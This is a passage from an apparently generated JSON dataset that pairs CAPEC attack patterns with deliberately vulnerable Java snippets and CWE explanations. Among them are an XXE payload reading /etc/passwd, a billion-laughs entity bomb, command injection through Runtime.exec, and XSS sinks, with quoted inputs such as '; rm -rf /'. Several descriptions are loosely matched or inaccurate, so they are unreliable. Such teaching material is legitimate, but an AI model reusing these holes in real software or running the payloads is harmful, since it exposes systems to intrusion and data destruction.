        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableSessionServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        HttpSession session = request.getSession();\n        String sessionId = session.getId();\n        String userRole = (String) session.getAttribute(\"userRole\");\n\n        // CWE-565: Reliance on Cookies without Validation and Integrity Checking\n        Cookie[] cookies = request.getCookies();\n        for (Cookie cookie : cookies) {\n            if (cookie.getName().equals(\"sessionId\")) {\n                sessionId = cookie.getValue();\n            }\n        }\n\n        // CWE-472: External Control of Assumed-Immutable Web Parameter\n        String userId = request.getParameter(\"userId\");\n\n        // CWE-384: Session Fixation\n        if (session.isNew()) {\n            session.setAttribute(\"userId\", userId);\n        }\n\n        // CWE-613: Insufficient Session Expiration\n        session.setMaxInactiveInterval(30 * 60); // 30 minutes\n\n        // CWE-603: Use of Client-Side Authentication\n        if (\"admin\".equals(userRole)) {\n            response.getWriter().println(\"Welcome, admin!\");\n        } else {\n            response.getWriter().println(\"Access Denied\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates several vulnerabilities related to session credential falsification through manipulation. The code handles session management and user authentication in a way that embodies the main idea of the CAPEC and related CWEs:\n\n1. **CWE-565: Reliance on Cookies without Validation and Integrity Checking** - The code retrieves the session ID from cookies without validating its integrity, making it susceptible to manipulation.\n2. **CWE-472: External Control of Assumed-Immutable Web Parameter** - The user ID is taken directly from a request parameter, which can be externally controlled and manipulated.\n3. **CWE-384: Session Fixation** - The code does not invalidate the existing session ID when a new session is created, allowing an attacker to fixate a session ID.\n4. **CWE-613: Insufficient Session Expiration** - The session expiration is set, but it may not be sufficient to prevent reuse of old session credentials.\n5. **CWE-603: Use of Client-Side Authentication** - The code relies on a client-side attribute (`userRole`) to determine access, which can be bypassed by modifying the client.\n\nOverall, this code snippet represents the main idea of session credential falsification through manipulation by demonstrating how various weaknesses can be exploited to gain unauthorized access to a target application."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "import java.util.concurrent.Executors;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class ResourceEngagement {\n    private static final int MAX_THREADS = 100;\n    private static final int TASK_DURATION_MS = 1000;\n    private static ThreadPoolExecutor executor = (ThreadPoolExecutor) Executors.newFixedThreadPool(MAX_THREADS);\n\n    public static void main(String[] args) throws InterruptedException {\n        while (true) {\n            executor.execute(() -> {\n                try {\n                    // Simulate a task that keeps the resource engaged\n                    Thread.sleep(TASK_DURATION_MS);\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                }\n            });\n            // No throttling or limit on task submission\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can engage a resource (a thread pool) continuously, leading to potential denial of service for legitimate users. The code creates a fixed thread pool with a maximum of 100 threads and continuously submits tasks that keep the threads busy for a specified duration. There is no throttling or limit on the number of tasks submitted, which can lead to uncontrolled resource consumption (CWE-400) and allocation of resources without limits (CWE-770). This represents the main idea of the CAPEC 'Sustained Client Engagement' by keeping the resource engaged and unavailable for legitimate users."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\n\npublic class DTDInjectionExample {\n    public static void main(String[] args) {\n        String xmlData = \"<?xml version=\\\"1.0\\\"?>\\n\" +\n                        \"<!DOCTYPE root [\\n\" +\n                        \"<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">\\n\" +\n                        \"]>\\n\" +\n                        \"<root>&xxe;</root>\";\n\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n            dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", true);\n\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xmlData)));\n\n            System.out.println(\"Parsed XML: \" + doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a DTD Injection vulnerability. The XML data contains a malicious DTD that attempts to read the contents of the '/etc/passwd' file using an external entity. The DocumentBuilderFactory is configured to allow external entities and DTD declarations, which makes the application vulnerable to DTD Injection attacks. This example highlights the risks associated with improper control of DTDs (CWE-827), inclusion of functionality from untrusted sources (CWE-829), and improper restriction of XML external entity references (CWE-611)."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "import java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String maliciousXML = \"<root>\";\n        for (int i = 0; i < 100000; i++) {\n            maliciousXML += \"<element>value</element>\";\n        }\n        maliciousXML += \"</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(maliciousXML)));\n            System.out.println(\"Parsed XML successfully\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the 'Serialized Data Parameter Blowup' attack. The code constructs a large XML document with a massive number of elements, which can cause a denial of service (DoS) condition when parsed by a vulnerable XML parser. The DocumentBuilderFactory and DocumentBuilder classes are used to parse the XML, but no limits are imposed on the size or complexity of the XML data, leading to potential resource exhaustion (CWE-770). Additionally, the code does not handle XML external entities (CWE-611), which could further exacerbate the vulnerability. This example highlights the importance of implementing proper resource limits and secure parsing practices to prevent such attacks."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.InputSource;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String maliciousXML = \"<!DOCTYPE root [<!ENTITY lol 'lol'><!ENTITY lol2 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'><!ENTITY lol3 '&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;'><!ENTITY lol4 '&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;'><!ENTITY lol5 '&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;'><!ENTITY lol6 '&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;'><!ENTITY lol7 '&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;'><!ENTITY lol8 '&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;'><!ENTITY lol9 '&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;'><!ENTITY lol10 '&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;'>]><root>&lol10;</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(maliciousXML)));\n            System.out.println(\"Parsed XML successfully\");\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Serialized Data with Nested Payloads' (CAPEC). The code uses an XML parser to process a malicious XML string containing deeply nested entities. This can lead to excessive memory consumption and CPU utilization, causing a Denial of Service (DoS) attack. The code does not validate the XML against a schema (CWE-112), improperly handles input validation (CWE-20), and does not control recursion (CWE-674). Additionally, it allocates resources without limits (CWE-770) and relies on machine-dependent data representation (CWE-1102). The main idea is to show how an adversary can exploit nested structures in serialized data to exhaust system resources."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "import java.io.ByteArrayInputStream;\nimport java.io.ObjectInputStream;\nimport java.io.IOException;\n\npublic class VulnerableDeserializer {\n    public static void main(String[] args) {\n        byte[] oversizedPayload = new byte[Integer.MAX_VALUE]; // CWE-770: No limit on resource allocation\n        try {\n            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(oversizedPayload);\n            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);\n            Object obj = objectInputStream.readObject(); // CWE-20: Improper input validation\n            System.out.println(\"Deserialized object: \" + obj);\n        } catch (IOException | ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Oversized Serialized Data Payloads' (CAPEC). The code attempts to deserialize an oversized payload without proper validation or resource limits. The 'oversizedPayload' array is created with a size of Integer.MAX_VALUE, which can exhaust system resources (CWE-770). The deserialization process does not validate the input (CWE-20), potentially leading to resource exhaustion or arbitrary code execution. This example highlights the risks of handling untrusted serialized data without proper validation and resource management."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "public class PrivilegeEscalationExample {\n    private boolean isAdmin = false;\n\n    public void login(String username, String password) {\n        if (\"admin\".equals(username) && \"adminPass\".equals(password)) {\n            isAdmin = true;\n        }\n    }\n\n    public void performAdminTask() {\n        if (isAdmin) {\n            System.out.println(\"Admin task performed.\");\n        } else {\n            System.out.println(\"Insufficient privileges.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        PrivilegeEscalationExample example = new PrivilegeEscalationExample();\n        example.login(\"user\", \"userPass\");\n        example.performAdminTask();\n\n        // Vulnerability: Directly setting isAdmin to true\n        example.isAdmin = true;\n        example.performAdminTask();\n    }\n}",
        "description": "This Java code snippet demonstrates a simple privilege escalation vulnerability. The `PrivilegeEscalationExample` class has a boolean field `isAdmin` that determines if a user has admin privileges. The `login` method sets this field to true if the correct admin credentials are provided. The `performAdminTask` method checks the `isAdmin` field before performing an admin task.\n\nThe vulnerability lies in the fact that the `isAdmin` field is publicly accessible and can be directly modified. In the `main` method, after a regular user logs in, the `isAdmin` field is directly set to true, allowing the user to perform admin tasks without proper authentication. This represents CWE-269 (Improper Privilege Management) and CWE-274 (Improper Handling of Insufficient Privileges), as the code does not properly manage or check privileges, leading to an unintended elevation of privileges."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "import java.io.*;\n\npublic class PrivilegedProcess {\n    public static void main(String[] args) {\n        try {\n            // CWE-250: Execution with Unnecessary Privileges\n            ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\", \"-c\", \"ls /root\");\n            pb.redirectErrorStream(true);\n            Process process = pb.start();\n\n            // CWE-114: Process Control\n            InputStream is = process.getInputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(is));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n\n            // CWE-271: Privilege Dropping / Lowering Errors\n            // The process should drop privileges here, but it doesn't\n            // This allows the attacker to hijack the process and execute arbitrary code with elevated privileges\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a privileged process that can be hijacked by an attacker. The code uses a ProcessBuilder to execute a shell command with elevated privileges (CWE-250). It reads the output of the command and prints it to the console. However, it does not drop privileges before executing the command (CWE-271), and it does not validate the command source (CWE-114). This creates a scenario where an attacker can hijack the process and execute arbitrary code with elevated privileges, embodying the main idea of the CAPEC 'Hijacking a privileged process'."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    private static String secret = \"SensitiveData\";\n\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n\n    private static class ClientHandler implements Runnable {\n        private Socket clientSocket;\n\n        public ClientHandler(Socket socket) {\n            this.clientSocket = socket;\n        }\n\n        @Override\n        public void run() {\n            try {\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    if (inputLine.equals(\"GET_SECRET\")) {\n                        out.println(secret);\n                    }\n                }\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for incoming connections on port 8080. The server spawns a new thread for each client connection, which handles client requests. The server contains a static non-final variable 'secret' that holds sensitive data. If a client sends the message 'GET_SECRET', the server responds with the sensitive data. This code is vulnerable to several issues:\n\n1. **CWE-1058**: The static non-final variable 'secret' can be accessed and modified by any thread, leading to potential data corruption or leakage in a multi-threaded environment.\n2. **CWE-294**: The server does not implement any authentication mechanism, making it susceptible to capture-replay attacks where an attacker can sniff and replay the 'GET_SECRET' request to obtain the sensitive data.\n3. **CWE-782**: The server exposes a sensitive operation (retrieving the secret) without proper access control, allowing any client to access it.\n\nThe main idea of the CAPEC is demonstrated by the server's use of a callback mechanism (handling client requests) that can be hijacked to perform privileged operations (accessing sensitive data) without proper security controls."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class PrivilegedThreadHijack {\n    public static void main(String[] args) {\n        try {\n            // Simulate privileged operation\n            performPrivilegedOperation();\n        } catch (Exception e) {\n            // Catching all exceptions without proper handling\n            System.out.println(\"An error occurred: \" + e.getMessage());\n        }\n    }\n\n    private static void performPrivilegedOperation() throws IOException {\n        // Simulate reading a sensitive file\n        String content = new String(Files.readAllBytes(Paths.get(\"/etc/sensitive_file\")));\n        System.out.println(\"Sensitive content: \" + content);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a privileged operation (reading a sensitive file) is performed within a try-catch block. The catch block catches all exceptions but does not handle them properly, merely printing the error message. This can be exploited by an attacker to hijack the privileged thread of execution, as the exception handling is insufficient. The code also touches on CWE-391 (Unchecked Error Condition) by ignoring proper error handling, which can lead to unexpected behavior. The main idea is to show how improper exception handling in privileged code can be a security vulnerability."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "public class SandboxEscape {\n    static {\n        System.loadLibrary(\"nativeLib\"); // Load native C library\n    }\n\n    // Native method declaration\n    private native void performUnsafeOperation();\n\n    public static void main(String[] args) {\n        SandboxEscape escape = new SandboxEscape();\n        escape.performUnsafeOperation(); // Call to native method\n    }\n}\n\n// Corresponding C code (nativeLib.c)\n#include <jni.h>\n#include <stdio.h>\n#include <stdlib.h>\n\nJNIEXPORT void JNICALL Java_SandboxEscape_performUnsafeOperation(JNIEnv *env, jobject obj) {\n    // Unsafe operation: modifying arbitrary memory location\n    int *ptr = (int *)malloc(sizeof(int));\n    *ptr = 42; // Arbitrary write\n    printf(\"Unsafe operation performed: %d\\n\", *ptr);\n    free(ptr);\n}",
        "description": "This Java code snippet demonstrates a potential sandbox escape by calling native C code using the Java Native Interface (JNI). The Java class `SandboxEscape` loads a native library `nativeLib` and declares a native method `performUnsafeOperation`. In the `main` method, it calls this native method. The corresponding C code for the native method performs an unsafe operation by modifying an arbitrary memory location. This example embodies the main idea of CAPEC-142: 'Escaping a Sandbox by Calling Code in Another Language'. It also highlights related CWEs such as CWE-111 (Direct Use of Unsafe JNI) and CWE-693 (Protection Mechanism Failure), as the JNI call exposes the Java application to unsafe operations that are not restricted by the Java sandbox."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String url = request.getParameter(\"url\");\n        if (isAuthorized(request)) {\n            // Authorization check before URL parsing\n            response.sendRedirect(url); // CWE-551: Incorrect Behavior Order\n        } else {\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n        }\n    }\n\n    private boolean isAuthorized(HttpServletRequest request) {\n        // Simplified authorization logic\n        String user = request.getParameter(\"user\");\n        return \"admin\".equals(user);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where authorization is checked before URL parsing (CWE-551). The `doGet` method retrieves a URL parameter and checks if the user is authorized. If authorized, it redirects to the provided URL without parsing or validating it, potentially allowing an attacker to bypass authorization by manipulating the URL. This embodies the deprecated CAPEC pattern of using a URL to convince a sandbox of privilege. The code also reflects CWE-424 by not sufficiently protecting alternate paths, as any user who passes the simplistic authorization check can access any URL."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String clientMessage = in.readLine();\n            if (clientMessage.equals(\"AUTHENTICATE\")) {\n                out.println(\"AUTH_SUCCESS\");\n            } else {\n                out.println(\"INVALID_COMMAND\");\n            }\n\n            // Client-side enforcement of server-side security\n            if (clientMessage.equals(\"DELETE_DATA\")) {\n                out.println(\"DATA_DELETED\");\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that embodies the main idea of the deprecated CAPEC related to subversion of authorization checks. The server listens on port 8080 and processes client messages. It performs a simple authentication check by expecting the message 'AUTHENTICATE' and responds with 'AUTH_SUCCESS'. However, the server also processes a 'DELETE_DATA' command without verifying if the client is authenticated, demonstrating client-side enforcement of server-side security (CWE-602). This allows an unauthorized client to send the 'DELETE_DATA' command and receive a 'DATA_DELETED' response, bypassing proper server-side authorization checks."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class ResourceInjectionExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"file\");\n        \n        // CWE-20: Improper Input Validation\n        if (fileName == null || fileName.isEmpty()) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"File name is missing\");\n            return;\n        }\n        \n        // CWE-99: Improper Control of Resource Identifiers\n        File file = new File(\"/var/www/uploads/\" + fileName);\n        \n        // CWE-1285: Improper Validation of Specified Index, Position, or Offset in Input\n        if (!file.exists() || !file.isFile()) {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \"File not found\");\n            return;\n        }\n        \n        // CWE-913: Improper Control of Dynamically-Managed Code Resources\n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.getWriter().println(line);\n            }\n        } catch (IOException e) {\n            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, \"Error reading file\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a resource injection vulnerability. The code takes a 'file' parameter from an HTTP GET request and uses it to construct a file path. The main idea of the CAPEC is represented by the lack of proper validation and control over the resource identifier (file name), which can be manipulated by an attacker to access unintended files. The code also highlights related CWEs: CWE-20 (Improper Input Validation) by not thoroughly validating the 'file' parameter, CWE-99 (Improper Control of Resource Identifiers) by directly using the input to construct a file path, CWE-1285 (Improper Validation of Specified Index, Position, or Offset in Input) by not checking if the file path is within the intended directory, and CWE-913 (Improper Control of Dynamically-Managed Code Resources) by not properly handling file reading operations."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter class name to load:\");\n        String className = scanner.nextLine();\n        try {\n            Class<?> cls = Class.forName(className);\n            Object instance = cls.getDeclaredConstructor().newInstance();\n            System.out.println(\"Class \" + className + \" loaded successfully.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable code injection scenario where user input is used to dynamically load a class. The code uses `Class.forName` to load a class based on user input, which can lead to code injection if an attacker provides a malicious class name. This example also touches on CWE-545 (Use of Dynamic Class Loading) and CWE-477 (Use of Obsolete Function) as it uses dynamic class loading and does not validate or sanitize the user input, making it susceptible to attacks."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class CodeInjectionExample {\n    public static void main(String[] args) {\n        try {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            System.out.print(\"Enter a command: \");\n            String userInput = reader.readLine();\n\n            // Vulnerable code: directly using user input in a command\n            String command = \"echo \" + userInput;\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader processReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = processReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a code injection vulnerability. The program reads a command from the user and directly uses it to construct a system command that is executed by the Runtime.getRuntime().exec() method. This is a classic example of improper control of code generation (CWE-94) and improper neutralization of special elements used in a command (CWE-77). An attacker can exploit this by injecting malicious commands, such as `; rm -rf /`, to execute arbitrary code on the system. The code does not validate or sanitize the user input, making it susceptible to code injection attacks."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class XSSVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"userInput\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<a href='#' style='color:red;' onmouseover='\" + userInput + \"'>Hover over me!</a>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to Cross-Site Scripting (XSS) targeting HTML attributes. The servlet takes user input from a request parameter and directly inserts it into an HTML attribute without proper sanitization. Specifically, the user input is placed inside the 'onmouseover' attribute of an anchor tag. If an attacker provides a malicious script as input, it will be executed when a user hovers over the link. This example embodies the main idea of CAPEC-83, CAPEC-82, and CAPEC-79, where improper neutralization of script in attributes can lead to XSS attacks. The code snippet highlights the importance of sanitizing user inputs to prevent such vulnerabilities."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerable\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<a href='\" + userInput + \"'>Click here</a>\");\n    }\n}\n",
        "description": "This Java servlet code demonstrates a vulnerability related to 'XSS Targeting URI Placeholders'. The servlet takes a user-provided input from the request parameter 'input' and directly embeds it into an anchor tag's href attribute without proper neutralization. This can be exploited by an attacker to inject a malicious URI, such as 'javascript:alert(1)', which would execute a script when the link is clicked. This example embodies CWE-83 (Improper Neutralization of Script in Attributes in a Web Page) and CWE-79 (Improper Neutralization of Input During Web Page Generation)."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        // Vulnerable to doubled character XSS attack\n        response.getWriter().println(\"<html><body>\" + userInput + \"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability to a doubled character XSS attack. The servlet takes user input from a request parameter named 'input' and directly includes it in the HTML response without proper validation or sanitization. If an attacker provides input with doubled characters, such as '<<script>alert(1);</script>', the input validation may fail to recognize the malicious script tag, leading to the execution of the script in the victim's browser. This snippet embodies the main idea of CAPEC-85 and related CWEs, highlighting the importance of proper input validation and neutralization to prevent XSS attacks."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        String sanitizedInput = userInput.replaceAll(\"<script>\", \"\"); // Incomplete denylist\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<img src='\" + sanitizedInput + \"'>\"); // Improper neutralization in IMG tag\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the deprecated CAPEC 'XSS Using Flash', now covered by CAPEC-174 and CAPEC-591. The code takes user input from an HTTP request parameter and attempts to sanitize it using an incomplete denylist (CWE-692). The sanitized input is then directly inserted into an IMG tag's src attribute without proper neutralization (CWE-82), making the application susceptible to XSS attacks. This example highlights the risks of using inadequate input sanitization methods and improper handling of user-controlled data in web applications."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        // Improper neutralization of invalid characters\n        if (userInput != null && userInput.contains(\"\\0\")) {\n            userInput = userInput.split(\"\\0\")[0];\n        }\n        // Improper neutralization of script-related HTML tags\n        response.getWriter().println(\"<html><body>\" + userInput + \"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where user input is improperly sanitized, allowing for XSS attacks. The code attempts to filter out null characters (\\0) but fails to properly neutralize other invalid characters or script-related HTML tags. An attacker can exploit this by injecting malicious scripts that bypass the filter, leading to potential XSS attacks. This snippet embodies the main idea of CAPEC-86 and related CWEs by showing how improper handling of invalid characters and script-related tags can lead to security vulnerabilities."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class CommandInjectionExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java CommandInjectionExample <command>\");\n            return;\n        }\n\n        String userInput = args[0];\n        try {\n            // Vulnerable code: directly using user input in a command\n            String command = \"ls \" + userInput;\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a command injection vulnerability. The program takes a single command-line argument from the user and appends it to an 'ls' command, which is then executed using `Runtime.getRuntime().exec()`. This approach is dangerous because it allows an attacker to inject arbitrary commands. For example, if the user input is `; rm -rf /`, the resulting command would be `ls ; rm -rf /`, which could delete all files on the system. This code embodies the main idea of CAPEC-88 (Command Injection) and related CWEs, such as CWE-77, CWE-78, and CWE-88, by showing how improper neutralization of special elements in command construction can lead to severe security vulnerabilities."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.IOException;\n\npublic class TerminalInjectionExample {\n    public static void main(String[] args) {\n        try {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            System.out.print(\"Enter a command: \");\n            String userInput = reader.readLine();\n\n            // Vulnerable code: directly using user input in a command\n            String command = \"/bin/sh -c \" + userInput;\n            Process process = Runtime.getRuntime().exec(command);\n\n            BufferedReader processReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = processReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
